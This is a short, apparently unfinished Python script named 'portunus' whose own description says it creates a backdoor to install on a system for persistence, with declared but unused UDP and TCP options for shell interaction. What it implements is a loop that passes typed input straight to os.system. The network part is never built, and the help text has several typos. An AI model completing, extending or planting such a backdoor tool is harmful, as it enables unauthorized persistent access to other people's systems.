import argparse
import os
import sys

parser = argparse.ArgumentParser(prog='portunus',
                                 description="creates a backdoor to install on a system to gain persistence")
connection = parser.add_mutually_exclusive_group()
connection.add_argument(
    "--udp", "-u", help="utilizes udp for shell interation")
connection.add_argument(
    "--tcp", '-t', help="estbalishes tcp connection for shell interation")

while True:
    command = input("> ")
    if 'quit' == command or command == 'exit':
        break
    try:
        os.system(command)
    except:
        print("failure executing command")
